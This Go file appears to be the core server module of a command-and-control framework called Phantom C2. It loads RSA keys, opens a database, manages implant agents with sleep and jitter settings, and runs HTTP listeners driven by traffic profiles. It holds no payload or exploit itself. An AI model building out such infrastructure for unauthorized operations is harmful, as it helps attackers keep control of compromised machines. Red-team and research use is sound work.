package server

import (
	"crypto/rsa"
	"fmt"
	"path/filepath"

	"github.com/google/uuid"
	"github.com/phantom-c2/phantom/internal/agent"
	cryptopkg "github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/listener"
	"github.com/phantom-c2/phantom/internal/task"
)

// Server is the core Phantom C2 server.
type Server struct {
	Config      *Config
	DB          *db.Database
	PrivKey     *rsa.PrivateKey
	PubKey      *rsa.PublicKey
	AgentMgr    *agent.Manager
	TaskDisp    *task.Dispatcher
	ListenerMgr *listener.Manager
	EventLog    []string
	OnEvent     func(string, ...interface{})
	Webhook     *WebhookNotifier
}

// New creates and initializes a new Phantom server.
func New(cfg *Config) (*Server, error) {
	// Open database
	database, err := db.Open(cfg.Server.Database)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}

	// Load RSA keys
	privKey, err := cryptopkg.LoadPrivateKey(cfg.Server.RSAPrivateKey)
	if err != nil {
		return nil, fmt.Errorf("load private key: %w", err)
	}
	pubKey, err := cryptopkg.LoadPublicKey(cfg.Server.RSAPublicKey)
	if err != nil {
		return nil, fmt.Errorf("load public key: %w", err)
	}

	s := &Server{
		Config:      cfg,
		DB:          database,
		PrivKey:     privKey,
		PubKey:      pubKey,
		AgentMgr:    agent.NewManager(database, cfg.Server.DefaultSleep, cfg.Server.DefaultJitter),
		TaskDisp:    task.NewDispatcher(database),
		ListenerMgr: listener.NewManager(),
	}

	return s, nil
}

// SetupListeners creates listeners from configuration.
func (s *Server) SetupListeners() error {
	for _, lc := range s.Config.Listeners {
		// Load profile
		profilePath := filepath.Join("configs", "profiles", lc.Profile+".yaml")
		profile, err := listener.LoadProfile(profilePath)
		if err != nil {
			profile = listener.DefaultProfile()
		}

		l := listener.NewHTTPListener(listener.ListenerConfig{
			ID:       uuid.New().String(),
			Name:     lc.Name,
			Type:     lc.Type,
			BindAddr: lc.Bind,
			Profile:  profile,
			TLSCert:  lc.TLSCert,
			TLSKey:   lc.TLSKey,
			PrivKey:  s.PrivKey,
			AgentMgr: s.AgentMgr,
			TaskDisp: s.TaskDisp,
			OnEvent:  s.handleEvent,
			Database: s.DB,
		})

		if err := s.ListenerMgr.Add(l); err != nil {
			return err
		}

		// Save to DB
		s.DB.InsertListener(&db.ListenerRecord{
			ID:        l.ID,
			Name:      l.Name,
			Type:      l.Type,
			BindAddr:  l.BindAddr,
			ProfileID: lc.Profile,
			TLSCert:   lc.TLSCert,
			TLSKey:    lc.TLSKey,
			Status:    "stopped",
		})
	}
	return nil
}

// StartListener starts a listener by name.
func (s *Server) StartListener(name string) error {
	err := s.ListenerMgr.Start(name)
	if err == nil {
		if l, ok := s.ListenerMgr.Get(name); ok {
			s.DB.UpdateListenerStatus(l.ID, "running")
		}
	}
	return err
}

// StopListener stops a listener by name.
func (s *Server) StopListener(name string) error {
	err := s.ListenerMgr.Stop(name)
	if err == nil {
		if l, ok := s.ListenerMgr.Get(name); ok {
			s.DB.UpdateListenerStatus(l.ID, "stopped")
		}
	}
	return err
}

// Shutdown gracefully shuts down the server.
func (s *Server) Shutdown() {
	s.ListenerMgr.StopAll()
	s.DB.Close()
}

// handleEvent processes events from listeners and other components.
func (s *Server) handleEvent(event string, args ...interface{}) {
	msg := fmt.Sprintf("[%s]", event)
	for _, a := range args {
		msg += fmt.Sprintf(" %v", a)
	}
	s.EventLog = append(s.EventLog, msg)

	if s.OnEvent != nil {
		s.OnEvent(event, args...)
	}
}
